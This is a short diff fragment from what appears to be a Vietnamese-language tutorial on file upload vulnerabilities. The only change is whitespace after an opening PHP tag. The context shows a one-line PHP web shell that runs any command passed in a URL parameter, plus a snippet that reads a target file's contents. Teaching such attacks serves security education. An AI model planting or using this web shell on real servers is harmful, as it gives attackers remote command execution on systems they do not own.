@@ -22,7 +22,7 @@ echo file_get_contents('/path/to...');
 Sau khi tải lên , việc gửi yêu cầu đối với tập tin độc hại này sẽ trả về nội dung của tập tin mục tiêu trong phản hồi
 > Một webshell đa năng hơn : <br>
 ```php
-<?php 
+<?php   
 echo system($_GET['cmd']);
 ?>
 ```
